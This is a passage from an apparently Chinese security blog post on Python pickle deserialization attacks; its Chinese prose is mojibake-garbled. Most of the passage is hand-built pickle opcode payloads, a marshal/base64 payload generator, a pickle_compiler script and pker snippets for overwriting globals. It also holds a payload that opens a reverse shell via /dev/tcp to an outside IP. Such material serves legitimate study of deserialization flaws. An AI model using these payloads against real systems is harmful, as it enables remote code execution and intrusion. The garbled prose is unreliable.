&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç°åœ¨å¾—åˆ°äº†åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¸Œæœ›å®ƒè¢«ååºåˆ—åŒ–æ—¶æ‰§è¡Œï¼Œä½†æ˜¯ç›´æ¥å°†ä»–æ”¾å…¥&lt;code>__reduce__&lt;/code>è¿”å›éƒ¨åˆ†ä¼¼ä¹å¹¶ä¸å¯ä»¥ï¼Œ&lt;code>__reduce__&lt;/code>æ˜¯è°ƒç”¨callableæ¥æ‰§è¡Œå‚æ•°ä¹‹ç±»çš„ï¼Œè€Œæˆ‘ä»¬æ„é€ å¥½çš„æœ¬èº«å°±æ˜¯callableï¼Œå¸Œæœ›å®ƒæ‰§è¡Œè€Œä¸æ˜¯ä½œä¸ºå¦ä¸€ä¸ªcallableçš„å‚æ•°ï¼›è¿™æ—¶å°±éœ€è¦ç›´æ¥ä»PVMæ“ä½œç çš„å±‚çº§è¿›è¡Œæ„é€ äº†ã€‚&lt;/p>
&lt;p>â€”â€”â€”â€”å…¶å®æˆ‘è§‰å¾—æ›´é€šä¿—çš„ç†è§£æ˜¯è¿™æ ·å¯ä»¥ä¸æŠŠè¦æ‰§è¡Œçš„ä»£ç é™åˆ¶åœ¨&lt;code>return (os.system,(a,))&lt;/code>è¿™æ ·å¼çš„æ¡†æ¶ä¸­ï¼Œè€Œæ˜¯å¯ä»¥è‡ªç”±çš„æ‰§è¡Œä»£ç ï¼Œæˆ–è€…è¯´å°±æ˜¯å¦ä¸€ç§å½¢å¼çš„pker&lt;/p>
&lt;p>æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å…¶å®æ˜¯ï¼ˆåˆ©ç”¨åˆ°python oopçš„ç‰¹æ€§ï¼Œé€šè¿‡&lt;code>types.FunctionTyle(func_code,globals(),â€™â€™)()&lt;/code>æ¥åŠ¨æ€åœ°åˆ›å»ºåŒ¿åå‡½æ•°ï¼Œå‚è§ï¼š&lt;a href="https://docs.python.org/zh-cn/3/library/types.html#module-types">å®˜æ–¹æ–‡æ¡£&lt;/a>ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">types&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FunctionType&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code_enc&lt;/span>&lt;span style="color:#111">)),&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">))()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…æ›´å¯è¯»ä¸€äº›&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">code_str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code_enc&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code_str&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">func&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">types&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FunctionType&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">func&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ¥ä¸‹æ¥å°±æ˜¯æ‰‹åŠ¨æ„é€ opcodeçš„æ—¶å€™äº†ï¼Œå›æƒ³ä¹‹å‰è¿”å›ä¸€ä¸ªç®€å•çš„shellæ—¶çš„opcode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cos&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">system&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¼€å¤´çš„cåé¢è·Ÿçš„æ˜¯å¼•å…¥çš„æ¨¡å—ï¼Œæ¢è¡Œä¹‹åæ˜¯å‡½æ•°ï¼Œå†æ¢è¡Œä¹‹åæ˜¯æ‰§è¡Œçš„è¯­å¥ï¼›æ ¹æ®è¿™ä¸ªç»“æ„æŠŠmarshalå’Œb64åŠ è¿›å»&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cmarshal&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">loads&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbase64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">b64decode&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;YwAAAAAB........&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tRtR&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è€Œglobals()å¯ä»¥åœ¨&lt;code>__builtin__&lt;/code>æ¨¡å—ä¸­å¼•å…¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{}{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">c__builtin__&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">globals&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tR&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æŠŠä¸Šé¢çš„ç¼åˆèµ·æ¥å¾—åˆ°æœ€ç»ˆçš„payloadï¼Œæ³¨æ„æ·»åŠ &lt;code>(rR.&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctypes&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">FunctionType&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmarshal&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">loads&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbase64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">b64decode&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;YwAAAAAB........&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tRtRc__builtin__&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">globals&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ„é€ è¿™ä¸ªäººçœ‹ç€è´¹åŠ²çš„payloadçš„æ¨¡æ¿~ï¼ˆæ¥æºå‚è§ï¼š&lt;a href="https://checkoway.net/musings/pickle/">Arbitrary code execution with Python pickles&lt;/a>ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># py2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">marshal&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">pass&lt;/span> &lt;span style="color:#75715e"># Your code here&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;ctypes
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">FunctionType
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">(cmarshal
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">loads
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">(cbase64
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">b64decode
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">(S&amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">tRtRc__builtin__
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">globals
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">(tRS&amp;#39;&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">tR(tR.&amp;#34;&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç”¨pickleæ‰§è¡Œä¸€ä¸‹é‚£ä¸²payloadçœ‹çœ‹æ•ˆæœ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809094819276.png" alt="image-20210809094819276">&lt;/p>
&lt;p>æˆåŠŸè¿”å›äº†æ–æ³¢é‚£å¥‘æ•°åˆ—çš„ç»“æœå’Œä¸€ä¸ªshell&lt;/p>
&lt;p>åŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå¯ä»¥ç”¨Marshal+b64çš„æ–¹å¼åå¼¹shellï¼ˆç”¨æ¨¡æ¿ç”Ÿæˆopcode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">marshal&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.29/8426 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># print &amp;#39;hold on...&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;ctypes
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">FunctionType
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">(cmarshal
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">loads
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">(cbase64
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">b64decode
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">(S&amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">tRtRc__builtin__
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">globals
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">(tRS&amp;#39;&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">tR(tR.&amp;#34;&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810015119794.png" alt="image-20210810015119794">&lt;/p>
&lt;p>â€”â€”â€”â€”æˆ–è€…ä¸‹é¢è¿™ä¸ªæ¨¡æ¿ä¹Ÿå¯ä»¥è¾¾åˆ°ä¸Šé¢çš„æ•ˆæœï¼ˆæ‰§è¡Œä»£ç  è€Œä¸åŒ…å«ç±»å’Œå‡½æ•°ï¼‰ï¼ˆæ¥æºï¼š&lt;a href="https://gist.github.com/freddyb/3360650#file-pickle_compiler-py">pickle_compiler.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">cPickle&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">ImportError&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">sys&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">argv&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">picklecompiler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sourcefile&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sourcecode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sourcefile&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;c__builtin__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">eval&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(c__builtin__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">compile&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">S&amp;#39;&amp;lt;payload&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&amp;#39;exec&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">tRtR.&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#111">sourcecode&lt;/span> &lt;span style="color:#111">)[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">],)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">usage&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;usage: python &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200"> filename&amp;#39;&amp;#39;&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">picklecompiler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">usage&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="å·¥å…·äºŒè¿---é€šè¿‡upkeruhttpsgithubcomeddieivan01pkeræ„é€ opcode">å·¥å…·äºŒè¿ - é€šè¿‡&lt;a href="https://github.com/eddieivan01/pker">&lt;u>pker&lt;/u>&lt;/a>æ„é€ opcode&lt;/h3>
&lt;p>åŸç†å‚è§ï¼š&lt;a href="https://xz.aliyun.com/t/7012#toc-5">é€šè¿‡ASTæ¥æ„é€ Pickle opcode - è‡ªåŠ¨åŒ–æ„é€ &lt;/a>ï¼Œåˆ©ç”¨äº†æŠ½è±¡è¯­æ³•æ ‘&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809232152276.png" alt="image-20210809232152276">&lt;/p>
&lt;p>pkerä¼šç”¨åˆ°&lt;code>GLOBAL&lt;/code>, &lt;code>INST&lt;/code>, &lt;code>OBJ&lt;/code>è¿™ä¸‰ç§ç‰¹æ®Šå‡½æ•°å’Œä¸€äº›å¿…è¦çš„è½¬æ¢æ–¹å¼ï¼›ä¸‹é¢æ˜¯pkerçš„ç®€å•å°æ —å­ï¼ˆæ›´å¤šä½¿ç”¨è¯´æ˜è¯¦è§ä¸Šé¢çš„é“¾æ¥ï¼‰&lt;/p>
&lt;ul>
&lt;li>
&lt;p>å…¨å±€å˜é‡è¦†ç›–&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># è¦†ç›–ç›´æ¥ç”±æ‰§è¡Œæ–‡ä»¶å¼•å…¥secretæ¨¡å—ä¸­çš„nameå’Œcategoryæ¨¡å—&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ecret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;secret&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># è¦†ç›–å¼•å…¥æ¨¡å—çš„å˜é‡&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">game&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;guess_game&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;game&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">game&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">curr_ticket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;123&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>å‡½æ•°æ‰§è¡Œ&lt;/p>
&lt;ul>
&lt;li>
